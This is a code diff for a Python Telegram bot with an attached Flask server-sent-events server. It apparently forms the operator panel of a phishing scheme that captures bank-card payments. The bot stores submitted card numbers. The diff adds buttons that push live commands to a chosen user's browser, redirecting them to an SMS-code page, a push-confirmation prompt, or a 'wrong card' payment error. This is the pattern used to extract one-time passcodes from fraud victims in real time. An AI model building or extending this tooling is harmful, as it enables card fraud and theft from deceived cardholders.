@@ -10,12 +10,18 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 import sqlite3
 import datetime
+import json
+import time
+import threading
+from threading import Lock
+from flask import Flask, Response, request
 
 # Загружаем переменные из .env
 load_dotenv()
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # Берем токен и ID из .env файла
 BOT_TOKEN = os.getenv('BOT_TOKEN')
@@ -30,6 +36,104 @@ bot = Bot(token=BOT_TOKEN)
 storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
 
+# SSE сервер
+app = Flask(__name__)
+sse_clients = {}
+sse_lock = Lock()
+
+@app.route('/sse/<user_id>')
+def sse(user_id):
+    """Server-Sent Events endpoint для получения команд"""
+    def event_stream():
+        # Регистрируем клиента
+        with sse_lock:
+            if user_id not in sse_clients:
+                sse_clients[user_id] = []
+            logger.info(f"✅ SSE подключен: {user_id}")
+        
+        try:
+            while True:
+                with sse_lock:
+                    if user_id in sse_clients and sse_clients[user_id]:
+                        # Отправляем все команды из очереди
+                        while sse_clients[user_id]:
+                            command = sse_clients[user_id].pop(0)
+                            yield f"data: {json.dumps(command)}\n\n"
+                
+                # Ждем перед следующей проверкой
+                time.sleep(0.5)
+                
+        except GeneratorExit:
+            # Клиент отключился
+            with sse_lock:
+                if user_id in sse_clients:
+                    del sse_clients[user_id]
+                    logger.info(f"❌ SSE отключен: {user_id}")
+
+    return Response(event_stream(), mimetype='text/event-stream')
+
+@app.route('/send_command', methods=['POST'])
+def send_command():
+    """Бот отправляет команду пользователю"""
+    try:
+        data = request.json
+        user_id = data.get('user_id')
+        action = data.get('action')
+        payment_id = data.get('payment_id')
+        
+        if not user_id or not action:
+            return {'error': 'Missing user_id or action'}, 400
+            
+        command_data = {
+            'type': 'bot_command',
+            'action': action,
+            'payment_id': payment_id,
+            'timestamp': datetime.datetime.now().isoformat()
+        }
+        
+        with sse_lock:
+            if user_id not in sse_clients:
+                sse_clients[user_id] = []
+            sse_clients[user_id].append(command_data)
+            
+        logger.info(f"✅ Команда отправлена {user_id}: {action}")
+        return {'status': 'success'}
+        
+    except Exception as e:
+        logger.error(f"❌ Ошибка отправки команды: {e}")
+        return {'error': str(e)}, 500
+
+@app.route('/health')
+def health():
+    """Проверка здоровья сервера"""
+    with sse_lock:
+        users_count = len(sse_clients)
+        total_commands = sum(len(commands) for commands in sse_clients.values())
+    
+    return {
+        'status': 'running',
+        'users_count': users_count,
+        'total_commands': total_commands,
+        'timestamp': datetime.datetime.now().isoformat()
+    }
+
+@app.route('/')
+def home():
+    return "🚀 Roomix Bot + SSE Server"
+
+def run_flask():
+    """Запуск Flask сервера в отдельном потоке"""
+    try:
+        port = int(os.environ.get('PORT', 5000))
+        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+    except Exception as e:
+        logger.error(f"💥 Ошибка запуска Flask: {e}")
+
+# Запускаем Flask в отдельном потоке
+flask_thread = threading.Thread(target=run_flask, daemon=True)
+flask_thread.start()
+
+# База данных и остальной код бота
 def init_db():
     conn = sqlite3.connect('applications.db')
     cursor = conn.cursor()
@@ -96,14 +200,14 @@ confirm_kb = types.ReplyKeyboardMarkup(
 )
 
 # Инлайн кнопки для платежей
-def get_payment_buttons(payment_id):
+def get_payment_buttons(payment_id, user_id="user_123"):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_code_{payment_id}"),
-            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}")
+            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_code_{payment_id}_{user_id}"),
+            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}_{user_id}")
         ],
         [
-            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}")
+            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}_{user_id}")
         ]
     ])
 
@@ -173,6 +277,36 @@ def save_payment(user_id, first_name, last_name, email, phone, card_number, card
     except Exception:
         return None
 
+# Функция отправки команды через HTTP
+async def send_sse_command(user_id, action_type, payment_id=None):
+    """Отправка команды через SSE сервер"""
+    try:
+        import requests
+        
+        # Получаем URL сервера (на Railway будет автоматический)
+        server_url = os.environ.get('RAILWAY_STATIC_URL', 'http://localhost:5000')
+        
+        response = requests.post(
+            f"{server_url}/send_command",
+            json={
+                'user_id': user_id,
+                'action': action_type,
+                'payment_id': payment_id
+            },
+            timeout=5
+        )
+        
+        if response.status_code == 200:
+            logger.info(f"✅ SSE команда отправлена {user_id}: {action_type}")
+            return True
+        else:
+            logger.error(f"❌ Ошибка SSE отправки: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        logger.error(f"💥 Ошибка HTTP запроса: {e}")
+        return False
+
 # Обработчик для чата - отправляем новое сообщение с кнопками
 @dp.message(F.chat.id == ADMIN_CHAT_ID)
 async def handle_chat_messages(message: types.Message):
@@ -236,64 +370,55 @@ async def process_payment_data(message: types.Message):
         pass
 
 # Обработчики инлайн кнопок для платежей
-# В разделе обработчиков платежей меняем:
-
 @dp.callback_query(F.data.startswith("sms_code_"))
 async def sms_code_handler(callback: types.CallbackQuery):
-    payment_id = callback.data.split("_")[2]
+    parts = callback.data.split("_")
+    payment_id = parts[2]
+    user_id = parts[3]
+    
+    # Отправляем команду через SSE
+    success = await send_sse_command(user_id, "sms", payment_id)
     
     await callback.message.edit_text(
-        f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>\n\n"
-        f"Пользователь будет перенаправлен на страницу SMS",
+        f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>\n\n" +
+        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки пользователю {user_id}"),
         parse_mode="HTML"
     )
-    
-    # Команда для браузера - перейти на SMS
-    # Нужно реализовать отправку команды в браузер
-    # Пока просто отправляем ссылку
-    await callback.message.answer(
-        f"Перейдите по ссылке: http://localhost:8000/loading.html?action=sms_redirect",
-        parse_mode="HTML"
-    )
-    
     await callback.answer("SMS код запрошен")
 
 @dp.callback_query(F.data.startswith("push_"))
 async def push_handler(callback: types.CallbackQuery):
-    payment_id = callback.data.split("_")[2]
+    parts = callback.data.split("_")
+    payment_id = parts[1]
+    user_id = parts[2]
+    
+    # Отправляем команду через SSE
+    success = await send_sse_command(user_id, "push", payment_id)
     
     await callback.message.edit_text(
-        f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>\n\n"
-        f"Пользователь увидит окно подтверждения",
+        f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>\n\n" +
+        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки пользователю {user_id}"),
         parse_mode="HTML"
     )
-    
-    # Команда для браузера - показать пуш
-    await callback.message.answer(
-        f"Перейдите по ссылке: http://localhost:8000/loading.html?action=push",
-        parse_mode="HTML"
-    )
-    
     await callback.answer("Пуш отправлен")
 
 @dp.callback_query(F.data.startswith("wrong_card_"))
 async def wrong_card_handler(callback: types.CallbackQuery):
-    payment_id = callback.data.split("_")[2]
+    parts = callback.data.split("_")
+    payment_id = parts[2]
+    user_id = parts[3]
+    
+    # Отправляем команду через SSE
+    success = await send_sse_command(user_id, "wrong_card", payment_id)
     
     await callback.message.edit_text(
-        f"❌ <b>Карта отклонена для платежа #{payment_id}</b>\n\n"
-        f"Пользователь будет перенаправлен на страницу оплаты с ошибкой",
+        f"❌ <b>Карта отклонена для платежа #{payment_id}</b>\n\n" +
+        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки пользователю {user_id}"),
         parse_mode="HTML"
     )
-    
-    # Команда для браузера - перейти на payment с ошибкой
-    await callback.message.answer(
-        f"Перейдите по ссылке: http://localhost:8000/payment.html?status=wrong_card",
-        parse_mode="HTML"
-    )
-    
     await callback.answer("Карта отклонена")
-# Обработчики для бота
+
+# Обработчики для бота (остальной код без изменений)
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     if message.chat.id == ADMIN_CHAT_ID:
@@ -691,11 +816,9 @@ async def reject_application(callback: types.CallbackQuery):
     await callback.answer()
 
 async def main():
-    print("Бот запущен! Ожидаю платежные данные в чате...")
+    logger.info("🚀 Бот запускается...")
+    logger.info("🌐 SSE сервер запущен на порту 5000")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
-
-
-
